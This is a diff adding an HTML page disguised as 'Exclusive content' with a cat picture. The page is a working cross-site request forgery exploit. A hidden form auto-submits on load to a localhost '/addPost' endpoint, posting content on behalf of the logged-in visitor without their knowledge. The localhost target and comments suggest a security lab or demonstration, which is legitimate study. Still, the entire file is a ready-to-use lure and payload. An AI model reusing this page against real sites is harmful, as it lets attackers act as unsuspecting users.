@@ -1,0 +1,29 @@
+<html>
+<head>
+      <title>Exclusive content</title>
+</head>
+<body>
+    <h2>Exclusive content!!! (add)</h2>
+    <iframe name="frame" style="display: none;"></iframe>
+    <img width="500" height="500" src="./images/cat-add.jpg" alt="">
+
+    <!-- Form for adding a post on behalf of the logged-in user -->
+    <form id="addPostForm" action="http://localhost:3000/addPost" method="POST" target="_blank">
+        <!-- Hidden input field for post content -->
+        <input type="hidden" name="content" id="contentInput" value="This is a new post">
+        <!-- Submit button -->
+        <input type="submit" value="Click here" id="submitButton" style="display: none;">
+    </form>
+
+    <!-- JavaScript code to automatically submit the form without user intervention -->
+    <script>
+        // JavaScript code to automatically submit the form
+        document.addEventListener('DOMContentLoaded', function() {
+            var form = document.getElementById('addPostForm');
+            // Automatically submit the form
+            form.submit();
+        });
+    </script>
+
+</body>
+</html>
